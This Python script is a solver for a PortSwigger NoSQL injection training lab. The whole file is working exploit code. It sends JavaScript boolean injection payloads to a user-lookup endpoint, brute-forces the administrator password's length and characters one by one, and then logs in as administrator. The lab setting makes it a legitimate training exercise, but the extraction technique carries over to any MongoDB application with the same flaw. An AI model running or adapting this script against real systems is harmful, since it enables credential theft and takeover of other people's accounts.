#!/usr/bin/env python3
# === Shadow Junior's NoSQL Injection Lab Solver - Fixed Version ===
# Target: PortSwigger Web Security Academy NoSQL Injection Lab
# Optimized for MongoDB NoSQL injection patterns

import string
import time
import logging
import sys
from urllib.parse import quote
import requests
from bs4 import BeautifulSoup

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Enhanced logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("NoSQLiSolver")

class NoSQLiLabSolver:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Only lowercase letters as per lab hint
        self.charset = string.ascii_lowercase
        self.request_count = 0

    def get_csrf_token(self, html: str) -> str:
        """Extract CSRF token from HTML"""
        soup = BeautifulSoup(html, 'html.parser')
        token = soup.find('input', {'name': 'csrf'})
        return token['value'] if token else ''

    def login_as_wiener(self) -> bool:
        """Login as wiener user"""
        logger.info("[*] Logging in as wiener...")
        try:
            login_url = f"{self.base_url}/login"
            resp = self.session.get(login_url, timeout=10)
            csrf = self.get_csrf_token(resp.text)
            
            data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
            r = self.session.post(login_url, data=data, timeout=10)
            self.request_count += 2
            
            if 'Log out' in r.text:
                logger.info("[+] Successfully logged in as wiener")
                return True
            else:
                logger.error("[-] Failed to login as wiener")
                return False
        except Exception as e:
            logger.error(f"[-] Login error: {e}")
            return False

    def test_payload(self, payload: str) -> tuple:
        """Test NoSQL injection payload"""
        try:
            params = {'user': payload}
            r = self.session.get(f"{self.base_url}/user/lookup", params=params, timeout=10)
            self.request_count += 1
            
            response_lower = r.text.lower()
            
            # Check for successful data retrieval (not error)
            has_user_data = ('email' in response_lower or 
                           'administrator' in response_lower or 
                           'wiener' in response_lower)
            
            # Check for error messages
            has_error = ('could not find user' in response_lower or 
                        'error' in response_lower or 
                        'exception' in response_lower or
                        'not found' in response_lower)
            
            success = has_user_data and not has_error
            
            return success, r.status_code, len(r.text), r.text
            
        except Exception as e:
            logger.debug(f"[-] Payload test error: {e}")
            return False, 0, 0, ""

    def verify_injection(self) -> bool:
        """Verify NoSQL injection vulnerability"""
        logger.info("[*] Testing for NoSQL injection vulnerability...")
        
        # Test basic concatenation
        payload = "wiener'+''"
        success, status, length, text = self.test_payload(payload)
        logger.info(f"[*] Testing basic concatenation: {success}")
        
        # Test boolean true condition
        payload = "wiener' && '1'=='1"
        success_true, _, _, _ = self.test_payload(payload)
        logger.info(f"[*] Testing true condition: {success_true}")
        
        # Test boolean false condition
        payload = "wiener' && '1'=='2"
        success_false, _, _, _ = self.test_payload(payload)
        logger.info(f"[*] Testing false condition: {success_false}")
        
        # Injection works if true condition succeeds and false condition fails
        if success_true and not success_false:
            logger.info("[+] NoSQL injection vulnerability confirmed!")
            return True
        
        logger.error("[-] No clear injection vulnerability detected")
        return False

    def find_password_length(self) -> int:
        """Find administrator password length"""
        logger.info("[*] Finding administrator password length...")
        
        # Try different lengths
        for length in range(1, 21):
            payload = f"administrator' && this.password.length=={length} || 'a'=='b"
            success, _, _, _ = self.test_payload(payload)
            
            if success:
                logger.info(f"[+] Password length found: {length}")
                return length
        
        # Alternative approach - use less than operator
        logger.info("[*] Trying alternative length detection...")
        for length in range(1, 21):
            payload = f"administrator' && this.password.length < {length + 1} && this.password.length > {length - 1} || 'a'=='b"
            success, _, _, _ = self.test_payload(payload)
            
            if success:
                logger.info(f"[+] Password length found (alternative): {length}")
                return length
        
        raise Exception("[-] Could not determine password length")

    def extract_password(self, length: int) -> str:
        """Extract password character by character"""
        logger.info(f"[*] Extracting {length}-character password...")
        
        password = ""
        for pos in range(length):
            found_char = False
            
            for char in self.charset:
                payload = f"administrator' && this.password[{pos}]=='{char}' || 'a'=='b"
                success, _, _, _ = self.test_payload(payload)
                
                if success:
                    password += char
                    logger.info(f"[+] Position {pos}: '{char}' | Current password: '{password}'")
                    found_char = True
                    break
            
            if not found_char:
                logger.warning(f"[-] Could not find character at position {pos}")
                password += "?"
        
        return password

    def login_as_admin(self, password: str) -> bool:
        """Login as administrator"""
        logger.info(f"[*] Attempting to login as administrator with password: '{password}'")
        
        try:
            login_url = f"{self.base_url}/login"
            resp = self.session.get(login_url, timeout=10)
            csrf = self.get_csrf_token(resp.text)
            
            data = {'csrf': csrf, 'username': 'administrator', 'password': password}
            r = self.session.post(login_url, data=data, timeout=10)
            self.request_count += 2
            
            if 'Log out' in r.text:
                logger.info("[+] Successfully logged in as administrator!")
                return True
            else:
                logger.error("[-] Failed to login as administrator")
                return False
        except Exception as e:
            logger.error(f"[-] Admin login error: {e}")
            return False

    def solve(self):
        """Main solving workflow"""
        logger.info(f"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    Shadow Junior's NoSQL Injection Lab Solver                   ║
║                              Production Ready v2.0                              ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ Target: {self.base_url:<65} ║
╚══════════════════════════════════════════════════════════════════════════════════╝""")
        
        start_time = time.time()
        
        try:
            # Step 1: Login as wiener
            if not self.login_as_wiener():
                return False
            
            # Step 2: Verify injection vulnerability
            if not self.verify_injection():
                logger.error("[-] Target does not appear vulnerable to NoSQL injection")
                return False
            
            # Step 3: Find password length
            password_length = self.find_password_length()
            
            # Step 4: Extract password
            password = self.extract_password(password_length)
            
            if '?' in password:
                logger.error("[-] Password extraction incomplete")
                return False
            
            # Step 5: Login as administrator
            if self.login_as_admin(password):
                duration = time.time() - start_time
                logger.info(f"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                              🎯 LAB SOLVED! 🎯                                  ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ Administrator Password: {password:<50} ║
║ Total Requests: {self.request_count:<20} Duration: {duration:.2f}s{' ' * 20} ║
║ Status: Successfully authenticated as administrator{' ' * 21} ║
╚══════════════════════════════════════════════════════════════════════════════════╝""")
                return True
            else:
                return False
                
        except Exception as e:
            logger.error(f"[-] Exploitation failed: {e}")
            return False

# === Quick Manual Testing Functions ===
def manual_test(base_url: str):
    """Manual testing function for debugging"""
    solver = NoSQLiLabSolver(base_url)
    
    # Login first
    if not solver.login_as_wiener():
        print("[-] Login failed")
        return
    
    # Test different payloads manually
    test_payloads = [
        "wiener",
        "wiener'+'",
        "wiener' && '1'=='1",
        "wiener' && '1'=='2",
        "administrator' && this.password.length==8 || 'a'=='b",
        "administrator' && this.password.length==9 || 'a'=='b",
        "administrator' && this.password[0]=='a' || 'a'=='b",
    ]
    
    for payload in test_payloads:
        success, status, length, text = solver.test_payload(payload)
        print(f"Payload: {payload:<50} | Success: {success} | Status: {status} | Length: {length}")
        if success:
            print(f"  Response snippet: {text[:100]}...")
        print()

# === Main Entry Point ===
def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = input("Enter the lab URL: ").strip()
    
    if not target_url:
        logger.error("[-] No target URL provided")
        return
    
    # Ask for manual testing mode
    test_mode = input("Run manual tests first? (y/n) [default: n]: ").lower()
    if test_mode == 'y':
        manual_test(target_url)
        return
    
    # Run the solver
    solver = NoSQLiLabSolver(target_url)
    success = solver.solve()
    
    if success:
        logger.info("[+] Lab solved successfully!")
    else:
        logger.error("[-] Lab solving failed")

if __name__ == "__main__":
    main()
